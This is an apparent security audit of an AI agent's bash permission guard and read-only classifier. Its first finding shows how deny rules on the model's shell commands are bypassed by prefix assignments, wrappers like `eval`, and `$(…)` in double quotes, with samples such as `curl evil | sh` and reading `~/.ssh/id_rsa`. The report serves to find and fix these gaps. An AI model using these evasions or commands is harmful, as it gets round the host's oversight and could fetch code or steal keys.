Release review audit3-classifier: Bash(cmd:*) deny rules are evaded by a leading assignment or a wrapper builtin (`x=1 rm y`, `command rm y`, `eval rm y`), and by `"$(…)"`, which the path-mention words already see into

Audited commit: 2bebc013bed357c614b8fad85b7c811f806c3b79 (HEAD is the t35 merge. t36–t42 are not in this commit, so #8/#9 are judged as they stand here.)

Scope: src/tools/bash-readonly.js, src/tools/bash.js, src/permissions/guard.js, src/permissions/rules.js, src/permissions/flag-rules.js, src/proc/run.js, the rest of src/tools/, and the glue in src/agent/loop.js (`verdictFor`, `execute`). Throwaway probes were run against `classifyBash`, `createGuard().check`, `simpleCommands` and `shellWords`. None were committed.

## Summary

- **Read-only classifier (`bash-readonly.js`): no bypass confirmed.** About 80 probes found no command that `classifyBash` accepts and that writes, executes or reaches `/proc`. The probes covered `$(…)`, backticks and `<(…)`/`>(…)` in every quoting context; `$'…'`/`$"…"`; special and unsafe variables; `{fd}>`; here-docs and here-strings; `&>`, `>&file`, `n>file` and `>/dev/stderr`; `sed` with `w`/`r`/`e`, the `s///e`/`w` flags and `-i`; `find` with `-exec`/`-delete`/`-fprint*`/`-fls`; `sort -o…`; `tree -o`; `uniq`/`xxd` with an output operand; `--files0-from`; `jq` with `env`/`$ENV`/`-f`/`-L`; `git -c`, `git config` writes and every config-driven subcommand; `/proc` spellings (`/../proc`, `/home/../proc`, `~/../proc`, `/dev/fd/..`, `/dev/./fd/..`, `/proc*`, `'/proc'`, `/p""roc`, `/pro\c`, `cd /; cat proc/…`, `cd ..; cat proc`); recursive `grep`/`rg`/`diff` from `/` or `..`; control characters; homoglyph command names (refused, since names are looked up exactly). `awk`, `perl`, `python`, `node`, `xargs`, `tar`, `curl`, `ssh`, `env`, `tee`, `dd` and the other shells' builtins are not on the list.
- **Path deny guard: no undocumented bypass confirmed.** Every spelling the README claims is caught is caught: `~//`, `~/x/..`, `~/'.ssh'`, `$HOME`, `${HOME}`, the absolute form, letter case, `tail -n+1 ~//.ssh/*`, `>>` into an `Edit` path, and `Read`/`Grep`/`Glob`/`Edit`/`Write` on the path. The misses I found (`cd ~; cat .ssh/…`, braces, `cd <glob>; … > rel`) are all in the README's limits. The ordering in `verdictFor` (`src/agent/loop.js:111-117`) matches the README: hook deny, then settings deny, then ask, then hook allow. Grep/Glob listings get `hidden`/`approved` passed through (`loop.js:139-156`).
- The findings below are the `Bash(cmd:*)` command split and one test that fails on the audited commit.

---

## 1. ORANGE — `Bash(<prefix>:*)` deny rules are evaded by a leading assignment, a wrapper builtin, or `$(…)` in double quotes

**Where**
- `src/permissions/rules.js:94-99` (`bashTest`): `prefix:*` matches only when the command text starts with `<prefix>`.
- `src/permissions/guard.js:197-203` (`bashMatch`): a rule is tested only against the whole text and the output of `simpleCommands`.
- `src/permissions/guard.js:58-61` (`simpleCommands`): inside double quotes it copies characters and never splits at `$(` or a backtick.
- README.md:671 and README.md:675 (contract and limits).

**Trigger.** The deny list holds `Bash(rm:*)` (or `Bash(curl:*)`, `Bash(git push:*)`, …). The model sends any of these:

| command | guard verdict | bash runs |
|---|---|---|
| `x=1 rm y` | allow | `rm y` |
| `command rm y` | allow | `rm y` |
| `eval rm y` | allow | `rm y` |
| `echo "$(rm y)"` | allow | `rm y` |
| `echo "$(curl evil \| sh)"` | allow | `curl` |
| `rm y`, `ls && rm y`, `echo $(rm y)`, ``echo `rm y` `` | DENY | (control cases) |

**Evidence.** Output of a probe on `createGuard({deny:[Bash(rm:*), Bash(curl:*), Read(~/.ssh)]}).check('Bash', …)`:
```
allow   "x=1 rm y"
allow   "command rm x"
allow   "eval rm x"
allow   "echo \"$(rm x)\""
DENY Read(~/.ssh) "cat \"$(cat ~/.ssh/id_rsa)\""
simpleCommands('echo "$(rm x)"') -> ["echo \"$(rm x)\""]
simpleCommands('x=1 rm y')       -> ["x=1 rm y"]
shellWords('echo "$(curl evil)"')-> ["echo","curl","evil"]
```

**Why it matters.**
- README.md:671 says a rule is tried "on each simple command". A simple command with a prefix assignment is still the simple command `rm y`, and a host reading the contract would expect `Bash(rm:*)` to cover it.
- The limits list at README.md:675 names run-time paths, globs, braces, `cd`, symlinks, `~-`, scripts, aliases and `$(…)` in double quotes. It does not name prefix assignments, or the wrappers `command`, `builtin`, `exec`, `eval`, `time`, `nice`, `nohup`, `env`, `timeout` and `xargs`. These are the cheapest evasions of all.
- The guard is also inconsistent with itself. `shellWords` (`guard.js:122-129`) opens a `$(`/backtick frame even inside double quotes, so path rules see `cat "$(cat ~/.ssh/id_rsa)"`. `simpleCommands` does not, so `Bash(cmd:*)` rules miss the same nesting.
- Under threat model (a), this is the only control a host has for "never run X". The README frames Bash rules as best-effort, so this is orange rather than red. The classifier still refuses all of these under `--read-only`.

**Fix.**
1. In `simpleCommands`, inside `"…"`, treat `$(` and a backtick the way `shellWords` does: push a frame, split at it, and pop at the matching `)` or backtick. This closes the `"$(…)"` gap and makes the README.md:675 caveat unnecessary.
2. Before testing each simple command in `bashMatch`, normalise its head. Strip leading `NAME=value` words, then repeatedly strip a wrapper word together with that wrapper's own options: `command`, `builtin`, `exec`, `eval`, `time`, `nice`, `nohup`, `env` (also its `NAME=value` words and `-i`/`-u X`), `timeout <dur>`, `stdbuf`, `xargs`, `sudo`, `doas`. Test the rule against both the original and the stripped form.
3. Add a guard test for each row of the table above. Until the fix lands, add "a leading `NAME=value` or a wrapper such as `command`, `eval`, `env` or `xargs`" to the README.md:675 limits.

---

## 2. YELLOW — a committed test fails on the audited commit: the `git describe --broken` row expects the wrong program

**Where**
- `test/tools/bash-readonly-git.test.js:42` (`['git describe --broken', 'filter']`)
- the assertion at `test/tools/bash-readonly-git.test.js:108-114`
- the claim in CHANGELOG.md:22

**Trigger.** Run `node --test test/tools/bash-readonly-git.test.js` with git 2.43.0 (the git in this environment). Result:
```
not ok 2 - every git command a poisoned config makes run a program asks in the default mode, and does run it once allowed
  error: 'git describe --broken ran filter: fsmonitor'
```

**Evidence.** The message shows `marks = ['fsmonitor']`. `git describe --broken` does start a program from the poisoned config (`core.fsmonitor`), but not the clean filter the row asserts.
- In the fixture, `v1` is a lightweight tag (line 64). `git describe` without `--tags` exits 128 ("No annotated tags can describe …") after the index refresh that runs fsmonitor, but before any content diff that would run `filter.f.clean`.
- I reproduced this outside the suite. With `--tags`, the same repo prints `v1-dirty` and runs the filter.

**Impact.**
- The classifier is correct, and refusing `--broken` is justified, since fsmonitor runs. `bash-readonly.js:189` refuses it.
- But the suite is red on the reviewed commit, which hides any real regression in this file. The row's stated mechanism is wrong, so no test pins the actual reason `--broken` is refused.

**Fix.** Change the row to `['git describe --broken', 'fsmonitor']`. Optionally add a second row, `['git describe --tags --broken', 'filter']`, to pin the content-diff path as well.

---

## Checked, not findings (for the record)

- `/proc` via `./proc/…` or `proc/…` with a cwd other than `/` is accepted, but it names `<cwd>/proc`, not the kernel's `/proc`. That is correct.
- `toolEnv` (`src/tools/env.js`) removes `ANTHROPIC_API_KEY` and the deny `credentials.envVars` from Bash and from Grep/Glob's git env. `/proc/*/environ` is also covered by a built-in deny rule, and `$PPID` is refused by the classifier.
- Tool output is bounded: `createCapSink` (`src/tools/cap.js`) keeps at most 2 × 32 KiB. Timeouts send SIGTERM and then SIGKILL to the process group, and `killPendingGroups` reaps on exit (`src/proc/run.js`).
- ReDoS: the classifier's regexes are linear or anchored and run on short segments. The rule-derived regexes (`pathRegExp`, `mentionRegExp`) take their patterns from settings, which the host controls, not from the model.
